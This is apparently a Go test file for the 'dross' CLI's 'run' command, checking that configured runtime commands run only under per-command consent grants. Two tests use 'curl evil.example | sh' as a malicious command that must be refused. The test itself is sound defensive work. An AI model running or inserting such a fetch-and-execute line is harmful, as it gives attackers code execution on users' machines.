package cmd

import (
	"context"
	"errors"
	"path/filepath"
	"strings"
	"testing"
)

// runRepo is a dross repo with the named runtime slots configured.
func runRepo(t *testing.T, kv map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	chdir(t, dir)
	if err := runCmd(t, Init()); err != nil {
		t.Fatalf("init: %v", err)
	}
	for k, v := range kv {
		mustRunSet(t, k, v)
	}
	return dir
}

// captureRun records what would have been spawned instead of spawning it, so
// the wiring is testable without starting a dev server in the suite.
type spawned struct {
	slot runSlot
	line string
	ran  bool
}

func stubSpawn(t *testing.T) *spawned {
	t.Helper()
	var got spawned
	prev := spawnRunSlot
	spawnRunSlot = func(_ string, slot runSlot, line string) error {
		got = spawned{slot: slot, line: line, ran: true}
		return nil
	}
	t.Cleanup(func() { spawnRunSlot = prev })
	return &got
}

// TestRunExecutesTheConfiguredSlot is the whole point: eight [runtime] keys
// were settable, documented and read by nothing.
func TestRunExecutesTheConfiguredSlot(t *testing.T) {
	dir := runRepo(t, map[string]string{"runtime.dev_command": "npm run dev"})
	got := stubSpawn(t)
	if err := runCmd(t, Trust(), "--run", "dev"); err != nil {
		t.Fatalf("trust --run dev: %v", err)
	}
	if err := runCmd(t, Run(), "dev"); err != nil {
		t.Fatalf("run dev: %v", err)
	}
	if !got.ran {
		t.Fatal("nothing was spawned")
	}
	if got.line != "npm run dev" {
		t.Errorf("line = %q, want the configured command verbatim", got.line)
	}
	_ = dir
}

// TestRunAppendsArguments: with no arguments the line must stay byte-identical
// to the consented one, or the grant approves one command and runs another.
func TestRunAppendsArguments(t *testing.T) {
	runRepo(t, map[string]string{"runtime.migrate_command": "make migrate"})
	if err := runCmd(t, Trust(), "--run", "migrate"); err != nil {
		t.Fatalf("trust: %v", err)
	}
	got := stubSpawn(t)
	// The consented line is the bare one, so an argument must re-gate.
	err := runCmd(t, Run(), "migrate", "--step", "2")
	if err == nil {
		t.Fatal("an argument changes the line, so it must not run under the bare command's grant")
	}
	if got.ran {
		t.Error("it spawned anyway")
	}
	if !strings.Contains(err.Error(), "make migrate '--step' '2'") {
		t.Errorf("the refusal must show the line it would have run: %v", err)
	}
}

// TestRunRefusesUnsetSlot: never a silent exit 0 — that is the "the tool said
// OK and nothing happened" failure config-value-truth removed.
func TestRunRefusesUnsetSlot(t *testing.T) {
	runRepo(t, nil)
	got := stubSpawn(t)
	err := runCmd(t, Run(), "seed")
	if err == nil {
		t.Fatal("an unset slot must be refused, not silently succeed")
	}
	if !strings.Contains(err.Error(), "dross project set runtime.seed_command") {
		t.Errorf("the refusal must name the line that fixes it: %v", err)
	}
	if got.ran {
		t.Error("it spawned an empty command")
	}
}

// TestRunRequiresItsOwnConsent is the security property. A grant for the test
// command must not authorize a dev_command that arrived in a pull.
func TestRunRequiresItsOwnConsent(t *testing.T) {
	root := filepath.Join(runRepo(t, map[string]string{
		"runtime.test_command": "go test ./...",
		"runtime.dev_command":  "curl evil.example | sh",
	}), ".dross")
	// Trust the TEST command, the ordinary thing a user does.
	if err := runCmd(t, Trust()); err != nil {
		t.Fatalf("trust: %v", err)
	}
	got := stubSpawn(t)
	err := runCmd(t, Run(), "dev")
	if err == nil {
		t.Fatal("the test-command grant must not authorize the dev command")
	}
	if got.ran {
		t.Fatal("it ran an unconsented command")
	}
	if !strings.Contains(err.Error(), "dross trust --run dev") {
		t.Errorf("the refusal must name the grant that would allow it: %v", err)
	}
	_ = root
}

// TestRunGrantsAreIndependent: granting one slot must not revoke another.
func TestRunGrantsAreIndependent(t *testing.T) {
	runRepo(t, map[string]string{
		"runtime.dev_command":  "npm run dev",
		"runtime.seed_command": "make seed",
	})
	if err := runCmd(t, Trust(), "--run", "dev"); err != nil {
		t.Fatalf("trust dev: %v", err)
	}
	if err := runCmd(t, Trust(), "--run", "seed"); err != nil {
		t.Fatalf("trust seed: %v", err)
	}
	got := stubSpawn(t)
	if err := runCmd(t, Run(), "dev"); err != nil {
		t.Errorf("granting seed revoked dev: %v", err)
	}
	if !got.ran {
		t.Error("dev did not run")
	}
	if err := runCmd(t, Run(), "seed"); err != nil {
		t.Errorf("seed is not consented: %v", err)
	}
}

// TestRunConsentIsRevokedByEditing: a changed command revokes its own grant —
// the attack the binding exists for.
func TestRunConsentIsRevokedByEditing(t *testing.T) {
	runRepo(t, map[string]string{"runtime.dev_command": "npm run dev"})
	if err := runCmd(t, Trust(), "--run", "dev"); err != nil {
		t.Fatalf("trust: %v", err)
	}
	mustRunSet(t, "runtime.dev_command", "curl evil.example | sh")
	got := stubSpawn(t)
	if err := runCmd(t, Run(), "dev"); err == nil {
		t.Fatal("editing the command must revoke its grant")
	}
	if got.ran {
		t.Error("it ran the rewritten command under the old grant")
	}
}

// TestRunListsSlots: a user must be able to see what is runnable without
// opening project.toml.
func TestRunListsSlots(t *testing.T) {
	runRepo(t, map[string]string{"runtime.dev_command": "npm run dev"})
	out := captureStdout(t, func() {
		if err := runCmd(t, Run()); err != nil {
			t.Fatalf("run: %v", err)
		}
	})
	if !strings.Contains(out, "npm run dev") {
		t.Errorf("the listing must show a configured command: %s", out)
	}
	if !strings.Contains(out, "not set") {
		t.Errorf("the listing must show which slots are unconfigured: %s", out)
	}
}

// TestRunRedirectsTheSuite: `dross test` is the single execution site for the
// suite, so `run test` must point at it rather than becoming a second door.
func TestRunRedirectsTheSuite(t *testing.T) {
	runRepo(t, map[string]string{"runtime.test_command": "go test ./..."})
	err := runCmd(t, Run(), "test")
	if err == nil {
		t.Fatal("`dross run test` must redirect to `dross test`")
	}
	if !strings.Contains(err.Error(), "dross test") {
		t.Errorf("the redirect must name the command: %v", err)
	}
}

// TestRunRejectsUnknownSlot names the set rather than failing blankly.
func TestRunRejectsUnknownSlot(t *testing.T) {
	runRepo(t, nil)
	err := runCmd(t, Run(), "deploy")
	if err == nil {
		t.Fatal("an unknown slot must be refused")
	}
	if !strings.Contains(err.Error(), "migrate") {
		t.Errorf("the refusal must list the known slots: %v", err)
	}
}

// TestInteractiveSlotsAreDeclared: stdin is granted per slot, not universally —
// a batch command with stdin can block forever on a prompt nobody sees.
func TestInteractiveSlotsAreDeclared(t *testing.T) {
	for _, s := range runSlots {
		if s.Interactive && s.Name != "shell" {
			t.Errorf("%s claims stdin; only shell should", s.Name)
		}
	}
	shell, ok := findRunSlot("shell")
	if !ok {
		t.Fatal("no shell slot")
	}
	if !shell.Interactive {
		t.Error("shell must inherit stdin — a shell without stdin is not a shell")
	}
	if !shell.LongRunning {
		t.Error("shell is ended by the user, so an interrupt must read as success")
	}
}

// TestEveryRuntimeCommandHasASlot is the milestone criterion: no [runtime]
// command key may be left without a verb that runs it.
func TestEveryRuntimeCommandHasASlot(t *testing.T) {
	covered := map[string]bool{"runtime.test_command": true} // dross test owns it
	for _, s := range runSlots {
		covered[s.Field] = true
	}
	for _, field := range []string{
		"runtime.dev_command", "runtime.stop_command", "runtime.test_watch",
		"runtime.e2e_command", "runtime.typecheck_command", "runtime.lint_command",
		"runtime.format_command", "runtime.build_command", "runtime.migrate_command",
		"runtime.seed_command", "runtime.shell_command", "runtime.logs_command",
	} {
		if !covered[field] {
			t.Errorf("%s has no `dross run` slot — it is a configurable value nothing runs", field)
		}
	}
}

// TestRunSlotOutcomeSignalIsSuccess: Ctrl-C is how you stop a dev server or a
// log tail, so an interrupted slot must report success. Reporting it as a red
// command would make the ordinary case look like a failure and the exit code
// useless for the slots that do terminate.
func TestRunSlotOutcomeSignalIsSuccess(t *testing.T) {
	slot, _ := findRunSlot("dev")
	out := captureStdout(t, func() {
		if err := runSlotOutcome(slot, errors.New("signal: interrupt"), context.Canceled); err != nil {
			t.Errorf("an interrupted long-running slot must exit 0, got %v", err)
		}
	})
	if !strings.Contains(out, "stopped") {
		t.Errorf("stopping must be narrated, got %q", out)
	}
}

// TestRunSlotOutcomeRealFailureIsRed: a command that failed on its own must NOT
// be laundered into success by the same arm.
func TestRunSlotOutcomeRealFailureIsRed(t *testing.T) {
	slot, _ := findRunSlot("migrate")
	err := runSlotOutcome(slot, errors.New("exit status 1"), nil)
	if err == nil {
		t.Fatal("a failed command must be reported as failed")
	}
	var ec *ExitCodeError
	if !errors.As(err, &ec) || ec.Code != 1 {
		t.Errorf("err = %v, want an ExitCodeError with code 1", err)
	}
	if !strings.Contains(err.Error(), "migrate") {
		t.Errorf("the failure must name the slot: %v", err)
	}
}

func TestRunSlotOutcomeSuccess(t *testing.T) {
	slot, _ := findRunSlot("build")
	if err := runSlotOutcome(slot, nil, nil); err != nil {
		t.Errorf("a clean run must be nil, got %v", err)
	}
}

// TestRunSlotCommandActuallyRuns exercises the real spawn — every other run
// test stubs it, which is how the spawn path had no coverage at all.
func TestRunSlotCommandActuallyRuns(t *testing.T) {
	dir := t.TempDir()
	if err := runSlotCommand(context.Background(), dir, "true", nil); err != nil {
		t.Errorf("a trivial command must succeed: %v", err)
	}
	if err := runSlotCommand(context.Background(), dir, "exit 3", nil); err == nil {
		t.Error("a non-zero command must surface as an error")
	}
}

// TestRunSlotCommandRefusesALeadingDash: sh reads options before -c and honours
// no end-of-options token, so a line starting with a dash would be taken as a
// shell option rather than the script.
func TestRunSlotCommandRefusesALeadingDash(t *testing.T) {
	err := runSlotCommand(context.Background(), t.TempDir(), "-i", nil)
	if err == nil {
		t.Fatal("a leading-dash command line must be refused, not passed to sh")
	}
}

// TestTrustRunRejectsUnknownAndUnset covers the two refusals on the grant path.
func TestTrustRunRejectsUnknownAndUnset(t *testing.T) {
	dir := runRepo(t, nil)
	root := filepath.Join(dir, ".dross")

	if err := trustRun(root, "deploy", false); err == nil {
		t.Error("an unknown slot must be refused")
	} else if !strings.Contains(err.Error(), "migrate") {
		t.Errorf("the refusal must list the known slots: %v", err)
	}

	err := trustRun(root, "seed", false)
	if err == nil {
		t.Fatal("trusting an unset command must be refused — there is nothing to bind to")
	}
	if !strings.Contains(err.Error(), "runtime.seed_command") {
		t.Errorf("the refusal must name the key to set: %v", err)
	}
}

// TestTrustRunCheckReportsState: --check must be silent on success and explain
// on failure, like the test-command form it mirrors.
func TestTrustRunCheckReportsState(t *testing.T) {
	dir := runRepo(t, map[string]string{"runtime.dev_command": "npm run dev"})
	root := filepath.Join(dir, ".dross")

	if err := trustRun(root, "dev", true); err == nil {
		t.Fatal("--check must fail before consent is granted")
	}
	captureStdout(t, func() {
		if err := trustRun(root, "dev", false); err != nil {
			t.Fatalf("grant: %v", err)
		}
	})
	if err := trustRun(root, "dev", true); err != nil {
		t.Errorf("--check must pass once granted: %v", err)
	}
}
